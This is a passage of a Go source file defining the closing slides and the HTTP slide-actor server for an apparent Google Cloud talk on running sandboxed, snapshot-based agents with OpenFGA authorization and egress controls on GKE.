			SpeakerNotes: "Pocket Piece #7: ate-secret:// egress credential injection and actorJwt identity minting. That protects outbound calls—now how do we protect inbound calls before an unauthorized user even wakes a sleeping actor?",
		},
		{
			ID:               "slide-17",
			Index:            17,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "LIVE DEMO 08  •  MULTIPLAYER CANVAS & OPENFGA",
			Chapter:          "Demo 08 • Setup",
			Badge:            "LIVE DEMO 08",
			Title:            "A Figma canvas where unauthorized users can't even wake the actor",
			Subtitle:         "Each collaborative architecture room is a sleeping actor guarded at the router perimeter by OpenFGA relationship tuples.",
			Kind:             "chapter",
			HighlightPhrases: []string{"OpenFGA AccessPolicy", "before actor wakeup", "HTTP 403"},
			Points: []string{
				"Every document room holds its live ReactFlow node graph and collaborator cursors in Go heap RAM.",
				"OpenFGA AccessPolicy checks user-to-actor relationship tuples at atenet-router before actor wakeup.",
				"Unauthorized requests get HTTP 403 at the perimeter while the room stays asleep in Cloud Storage.",
			},
			DemoName: "Open Multiplayer Canvas",
			DemoURL:  "https://canvas.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"OpenFGA AccessPolicy",
				"Pre-Wake Perimeter Authz",
				"Per-Actor Tuple Graph",
			},
			SpeakerNotes: "In our final non-agent demo, every multiplayer architecture canvas is its own sleeping actor. When Mallory tries to open the M&A room without an OpenFGA relationship tuple, atenet-router rejects the call at the perimeter before the actor even wakes from Cloud Storage.",
		},
		{
			ID:               "slide-18",
			Index:            18,
			Total:            total,
			Layout:           "asd-cards",
			Kicker:           "PUZZLE PIECE 08 / 08  •  OPENFGA ACCESSPOLICY",
			Chapter:          "Piece 08 • Perimeter Authz",
			Badge:            "PIECE 08 / 08",
			Title:            "Enforce fine-grained relationship authz before waking compute",
			Subtitle:         "OpenFGA AccessPolicy evaluates per-actor tuples at the router perimeter so denied calls cost zero compute.",
			Kind:             "recap",
			HighlightPhrases: []string{"OpenFGA AccessPolicy", "atenet-router", "0ms actor wake"},
			Points: []string{
				"Each collaborative document room keeps its graph state in isolated Go heap RAM without shared tables.",
				"atenet-router verifies OpenFGA user, relation, and actor tuples before resuming a snapshot from GCS.",
				"Granting or revoking viewer and editor tuples takes effect immediately at the router perimeter.",
			},
			Cards: []SlideCard{
				{
					Number: "01",
					Title:  "One actor per room",
					Body:   "Each collaborative canvas keeps its node graph and presence in isolated Go heap RAM without shared database tables.",
				},
				{
					Number: "02",
					Title:  "Block at the perimeter",
					Body:   "atenet-router checks OpenFGA user, relation, and actor tuples before resuming a sleeping snapshot from Cloud Storage.",
				},
				{
					Number: "03",
					Title:  "Instant tuple revocation",
					Body:   "Granting or revoking editor and viewer tuples takes effect at the L7 proxy immediately with 0ms actor wake on deny.",
				},
			},
			DemoName: "Revisit Multiplayer Canvas",
			DemoURL:  "https://canvas.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"OpenFGA AccessPolicy",
				"Pre-Wake Router Enforcement",
				"Relationship Tuples",
				"Zero-Compute 403 Deny",
			},
			SpeakerNotes: "Pocket Piece #8: OpenFGA per-actor relationship authorization enforced at the router perimeter before wakeup. We now have all eight pieces from our eight non-agent demos—let's put them on the board!",
		},
		{
			ID:               "slide-19",
			Index:            19,
			Total:            total,
			Layout:           "asd-puzzle",
			Kicker:           "THE REBEL LOOT  •  EIGHT NON-AI DEMOS",
			Chapter:          "Finale 1 • Rebel Loot",
			Badge:            "8 PIECES COLLECTED",
			Title:            "Eight Substrate features we used without a single agent",
			Subtitle:         "Put all eight features from our demos on the board, and ask what else needs all eight at once.",
			Kind:             "puzzle",
			PuzzleStage:      "loot",
			PuzzlePieces:     buildPuzzlePieces("loot"),
			HighlightPhrases: []string{"Eight Substrate features", "all eight at once"},
			Points: []string{
				"Dungeon 2D, Coldstart, TenantDB, and Honeypot gave us RAM checkpoints, 100ms warm clones, DurableDir, and gVisor.",
				"Timewarp, Buildbox, Billing, and Canvas gave us turn-based wakeups, ActorEgressPolicy, ate-secret://, and OpenFGA.",
				"All 8 outer puzzle slots are filled from our non-AI demos—only the center slot is still empty.",
			},
			SubstrateFeatures: []string{
				"SNAPSHOT_FIDELITY_MEMORY",
				"Golden Snapshots + DurableDir",
				"gVisor + Egress + OpenFGA",
			},
			SpeakerNotes: "Pause before the punchline. All 8 outer slots of the board are now filled with the exact features we used across our 8 non-agent demos. Ask the room: what single workload needs all eight of these primitives at the same time?",
		},
		{
			ID:               "slide-20",
			Index:            20,
			Total:            total,
			Layout:           "asd-puzzle",
			Kicker:           "THE EPIPHANY  •  FLIP THE BOARD",
			Chapter:          "Finale 2 • Epiphany",
			Badge:            "WAIT A SECOND...",
			Title:            "Hold on... every piece we used is what an *agent* needs",
			Subtitle:         "Flip all eight non-AI demo pieces over. Each one solves a core problem in running production agents.",
			Kind:             "puzzle",
			PuzzleStage:      "epiphany",
			PuzzlePieces:     buildPuzzlePieces("epiphany"),
			HighlightPhrases: []string{"*agent*"},
			Points: []string{
				"Checkpointing, 100ms Golden Snapshots, DurableDir, and gVisor give agents working memory, warm toolchains, and safe code execution.",
				"Turn-based wakeups, ActorEgressPolicy, ate-secret://, and OpenFGA give agents human-paced turns, L7 airgaps, secret-free RAM, and tenant authz.",
			},
			SubstrateFeatures: []string{
				"Agent Working Memory",
				"100ms Warm Toolchains",
				"Zero-Trust Sandboxes",
			},
			SpeakerNotes: "Watch all eight tiles flip over in a 3D domino wave! Checkpointed working memory, 100ms warm toolchains, a private /workspace per session, untrusted bash inside gVisor, human-paced turn-based sleep, per-turn L7 egress firewalling, zero API keys in memory snapshots, and pre-wake OpenFGA tenant authorization. Now look at the one empty slot in the center.",
		},
		{
			ID:               "slide-21",
			Index:            21,
			Total:            total,
			Layout:           "asd-puzzle",
			Kicker:           "COMPLETE PUZZLE  •  SUBSTRATE + YOUR MODEL",
			Chapter:          "Finale 3 • Complete",
			Badge:            "PUZZLE COMPLETE",
			Title:            "Drop a *model* and agent loop into the center to get an agent",
			Subtitle:         "Agent Substrate ships all 8 outer pieces out of the box. You bring the model and agent loop in the center.",
			Kind:             "puzzle",
			PuzzleStage:      "complete",
			PuzzlePieces:     buildPuzzlePieces("complete"),
			HighlightPhrases: []string{"*model*", "8 outer pieces"},
			Points: []string{
				"Every outer piece we tested on games, databases, compilers, and canvases is built into Agent Substrate.",
				"Drop Gemini, Claude, or open weights plus your tool loop into the center slot to complete the agent.",
			},
			SubstrateFeatures: []string{
				"8 Substrate Primitives",
				"Model + Agent Loop",
				"Complete Agent Runtime",
			},
			SpeakerNotes: "Pause on the center slot for one beat—then watch the Model + agent loop keystone drop into the bullseye and send a shockwave across all eight Substrate pieces!",
		},
		{
			ID:               "slide-22",
			Index:            22,
			Total:            total,
			Layout:           "asd-closing",
			Kicker:           "AGENT SUBSTRATE  •  THANK YOU",
			Chapter:          "Closer • Sign-off",
			Badge:            "GOOGLE CLOUD BOOTH",
			Title:            "Come for the weird demos, stay for the *agents*",
			Subtitle:         "All eight demos, the Kubernetes manifests, and this 22-actor slide deck are open source.",
			Kind:             "closer",
			EventFooter:      eventLine,
			HighlightPhrases: []string{"*agents*"},
			Points: []string{
				"Dungeon 2D & Coldstart: checkpointed RAM with undo/branching and 100ms Golden Snapshot clones.",
				"TenantDB & Honeypot: isolated per-session DurableDir volumes and gVisor sandboxes with rootfs rollback.",
				"Timewarp, Buildbox, Billing & Canvas: turn-based wakeups, ActorEgressPolicy, ate-secret://, and OpenFGA.",
			},
			AgendaItems: []SlideAgendaItem{
				{Number: "01", Topic: "Working memory with undo & branching", Detail: "Dungeon 2D  •  SNAPSHOT_FIDELITY_MEMORY, revert, --tag"},
				{Number: "02", Topic: "Heavy runtimes cloned in ~100ms", Detail: "Coldstart  •  ActorTemplate Golden Snapshots"},
				{Number: "03", Topic: "Isolated /data volumes per session", Detail: "TenantDB  •  DurableDir & tiered suspend"},
				{Number: "04", Topic: "Untrusted /bin/sh inside gVisor", Detail: "Honeypot  •  Syscall isolation & rootfs revert"},
				{Number: "05", Topic: "Turn-based wake & indefinite waits", Detail: "Timewarp  •  atenet request parking & sleep"},
				{Number: "06", Topic: "Per-phase L7 & DNS egress airgap", Detail: "Buildbox  •  Dynamic ActorEgressPolicy firewall"},
				{Number: "07", Topic: "Zero API keys in RAM snapshots", Detail: "Billing  •  ate-secret:// MITM & actorJwt"},
				{Number: "08", Topic: "Relationship authz before wakeup", Detail: "Canvas  •  OpenFGA AccessPolicy at router"},
			},
			SignOffLines: []string{
				"Mofi Rahman  •  Lead DevRel GKE, Google Cloud",
				"@moficodes",
				"github.com/moficodes/anything-but-agents",
			},
			DemoName: "View repo on GitHub",
			DemoURL:  "https://github.com/moficodes/anything-but-agents",
			SubstrateFeatures: []string{
				"Memory Checkpointing",
				"Golden Snapshots",
				"DurableDir & gVisor",
				"Egress MITM & OpenFGA",
				"Turn-Based Wake",
			},
			SpeakerNotes: "Press H to reveal the top bar and live Substrate telemetry footer if hidden! Even this 22-slide presentation deck has been running as 22 sleeping gVisor actors on that same 3-pod WorkerPool. Thank the audience and share the GitHub repo.",
		},
	}
}

// GetSlideDef returns the slide definition matching the ID.
func GetSlideDef(id string) (SlideDef, bool) {
	for _, def := range AllSlideDefs() {
		if strings.EqualFold(def.ID, id) {
			return def, true
		}
	}
	return SlideDef{}, false
}

func cloneSlideData(in SlideData) SlideData {
	out := in
	out.Points = append([]string{}, in.Points...)
	out.HighlightPhrases = append([]string{}, in.HighlightPhrases...)
	out.Cards = append([]SlideCard{}, in.Cards...)
	if len(in.Columns) > 0 {
		out.Columns = make([]SlideColumn, len(in.Columns))
		for i, c := range in.Columns {
			out.Columns[i] = SlideColumn{
				Heading: c.Heading,
				Bullets: append([]string{}, c.Bullets...),
			}
		}
	}
	out.CodeLines = append([]string{}, in.CodeLines...)
	out.PuzzlePieces = append([]SlidePuzzlePiece{}, in.PuzzlePieces...)
	out.AgendaItems = append([]SlideAgendaItem{}, in.AgendaItems...)
	out.SignOffLines = append([]string{}, in.SignOffLines...)
	out.SubstrateFeatures = append([]string{}, in.SubstrateFeatures...)
	out.PodIPHistory = append([]string{}, in.PodIPHistory...)
	return out
}

// SlideActor manages the in-memory Go heap state for a single slide actor.
type SlideActor struct {
	mu           sync.Mutex
	data         SlideData
	initialNotes string
}

// NewSlideActor creates a SlideActor for a given slide ID.
func NewSlideActor(slideID string) *SlideActor {
	def, found := GetSlideDef(slideID)
	if !found {
		def = AllSlideDefs()[0]
	}
	ip := detectPodIP()
	return &SlideActor{
		data: SlideData{
			SlideDef:     def,
			ViewCount:    0,
			Notes:        "",
			PodIPHistory: []string{ip},
			CurrentPodIP: ip,
			LastWokenAt:  time.Now().UTC(),
		},
		initialNotes: "",
	}
}

func detectPodIP() string {
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ip4 := ipnet.IP.To4(); ip4 != nil {
					return ip4.String()
				}
			}
		}
	}
	return "127.0.0.1"
}

// BindSlideID binds the actor's static SlideDef to slideID when cloned from a
// shared ActorTemplate Golden Snapshot, preserving heap ViewCount, Notes, and PodIPHistory.
func (a *SlideActor) BindSlideID(slideID string) {
	if slideID == "" {
		return
	}
	def, found := GetSlideDef(slideID)
	if !found {
		return
	}
	a.mu.Lock()
	defer a.mu.Unlock()
	a.data.SlideDef = def
}

func requestedSlideID(r *http.Request) string {
	if qid := strings.TrimSpace(r.URL.Query().Get("id")); qid != "" {
		return qid
	}
	if target := strings.TrimSpace(r.Header.Get("ate-target-actor")); target != "" {
		if idx := strings.LastIndexByte(target, '/'); idx >= 0 && idx+1 < len(target) {
			return target[idx+1:]
		}
		return target
	}
	return ""
}

// GetSlide returns a copy of the current slide data, incrementing ViewCount and recording pod IP.
func (a *SlideActor) GetSlide() SlideData {
	a.mu.Lock()
	defer a.mu.Unlock()

	a.data.ViewCount++
	a.data.LastWokenAt = time.Now().UTC()
	ip := detectPodIP()
	a.data.CurrentPodIP = ip
	if len(a.data.PodIPHistory) == 0 || a.data.PodIPHistory[len(a.data.PodIPHistory)-1] != ip {
		a.data.PodIPHistory = append(a.data.PodIPHistory, ip)
	}

	return cloneSlideData(a.data)
}

// UpdateNote updates the live scratchpad note in Go heap RAM.
func (a *SlideActor) UpdateNote(note string) SlideData {
	a.mu.Lock()
	defer a.mu.Unlock()

	a.data.Notes = strings.TrimSpace(note)
	a.data.LastWokenAt = time.Now().UTC()

	return cloneSlideData(a.data)
}

// ResetToInitial restores the slide notes to initial state (used for local simulation of revert).
func (a *SlideActor) ResetToInitial() SlideData {
	a.mu.Lock()
	defer a.mu.Unlock()

	a.data.Notes = a.initialNotes
	a.data.LastWokenAt = time.Now().UTC()

	return cloneSlideData(a.data)
}

// NewActorMux creates the HTTP multiplexer for --mode=actor.
func NewActorMux(actor *SlideActor) *http.ServeMux {
	mux := http.NewServeMux()

	mux.HandleFunc("/readyz", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok\n"))
	})

	mux.HandleFunc("/healthz", func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok\n"))
	})

	mux.HandleFunc("/api/slide", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			actor.BindSlideID(requestedSlideID(r))
			slide := actor.GetSlide()
			writeJSON(w, http.StatusOK, slide)
		default:
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		}
	})

	mux.HandleFunc("/api/slide/note", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		actor.BindSlideID(requestedSlideID(r))
		var req struct {
			Notes string `json:"notes"`
			Note  string `json:"note"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, fmt.Sprintf("invalid JSON payload: %v", err), http.StatusBadRequest)
			return
		}
		note := req.Notes
		if note == "" {
			note = req.Note
		}
		slide := actor.UpdateNote(note)
		writeJSON(w, http.StatusOK, slide)
	})

	return mux
}

func writeJSON(w http.ResponseWriter, status int, data any) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.WriteHeader(status)
	enc := json.NewEncoder(w)
	enc.SetIndent("", "  ")
	_ = enc.Encode(data)
}
